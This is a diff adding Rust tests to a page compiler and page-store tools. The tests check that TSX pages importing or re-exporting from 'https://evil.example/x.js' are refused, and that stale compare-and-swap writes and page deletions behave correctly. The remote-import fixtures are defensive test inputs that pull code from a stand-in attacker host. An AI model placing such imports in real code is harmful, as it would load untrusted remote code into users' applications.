@@ -1195,6 +1195,28 @@ export default function Page() {
 }
 "#;
 
+    const DYNAMIC_IMPORT_TSX: &str = r#"
+import * as React from "react";
+
+export default function Page() {
+  const lazy = import("https://evil.example/x.js");
+  return <div>{lazy}</div>;
+}
+"#;
+
+    const EXPORT_FROM_TSX: &str = r#"
+import * as React from "react";
+export { React as R } from "https://evil.example/x.js";
+
+export default function Page() {
+  return <div>hi</div>;
+}
+"#;
+
+    const EXPORT_ALL_TSX: &str = r#"
+export * from "https://evil.example/x.js";
+"#;
+
     #[test]
     fn compiling_valid_tsx_produces_a_jsx_runtime_call() {
         let compiled = compile_page(VALID_TSX).expect("compiles");
@@ -1217,6 +1239,92 @@ export default function Page() {
             err.contains("node:fs"),
             "expected the diagnostic to name the disallowed import, got: {err}"
         );
+    }
+
+    #[test]
+    fn compiling_a_dynamic_import_is_refused() {
+        let err = compile_page(DYNAMIC_IMPORT_TSX).expect_err("must be refused");
+        assert!(
+            err.contains("https://evil.example"),
+            "expected the diagnostic to name the dynamic import, got: {err}"
+        );
+    }
+
+    #[test]
+    fn compiling_a_reexport_is_refused() {
+        for (label, src) in [
+            ("export * from", EXPORT_ALL_TSX),
+            ("export … from", EXPORT_FROM_TSX),
+        ] {
+            let err = compile_page(src).expect_err("must be refused");
+            assert!(
+                err.contains("https://evil.example"),
+                "{label}: expected the diagnostic to name the re-export, got: {err}"
+            );
+        }
+    }
+
+    #[tokio::test]
+    async fn pages_write_with_a_stale_expected_updated_at_is_refused_and_writes_nothing() {
+        let (_dir, store) = store().await;
+        let pages = pages(store, "acme");
+        let write = PagesWriteTool::new(pages.clone());
+        write
+            .execute(json!({
+                "slug": "revenue",
+                "title": "Revenue",
+                "source": VALID_TSX,
+            }))
+            .await
+            .expect("initial write ok");
+
+        let bundle = pages.page("revenue").await.expect("read ok").expect("exists");
+        let rev = bundle.source.expect("source node").updated_at_millis;
+
+        // A stale revision must be refused and leave the source untouched.
+        let result = write
+            .execute(json!({
+                "slug": "revenue",
+                "source": VALID_TSX,
+                "expected_updated_at": rev + 1,
+            }))
+            .await
+            .expect("execute ok");
+        assert!(result.is_error, "a CAS mismatch must be refused");
+        let after = pages.page("revenue").await.expect("read ok").expect("exists");
+        assert_eq!(
+            after.source.expect("source node").updated_at_millis,
+            rev,
+            "a refused CAS write must not bump or alter the source"
+        );
+
+        // The matching revision still succeeds.
+        let ok = write
+            .execute(json!({
+                "slug": "revenue",
+                "source": VALID_TSX,
+                "expected_updated_at": rev,
+            }))
+            .await
+            .expect("execute ok");
+        assert!(!ok.is_error, "a matching CAS write should succeed");
+    }
+
+    #[tokio::test]
+    async fn pages_delete_removes_the_whole_page() {
+        let (_dir, store) = store().await;
+        let pages = pages(store, "acme");
+        let write = PagesWriteTool::new(pages.clone());
+        write
+            .execute(json!({ "slug": "temp", "title": "Temp", "source": VALID_TSX }))
+            .await
+            .expect("write ok");
+        assert!(pages.page("temp").await.expect("read ok").is_some());
+
+        let delete = PagesDeleteTool::new(pages.clone());
+        let result = delete.execute(json!({ "slug": "temp" })).await.expect("execute ok");
+        assert!(!result.is_error, "delete should succeed");
+        assert!(pages.page("temp").await.expect("read ok").is_none());
     }
 
     #[tokio::test]
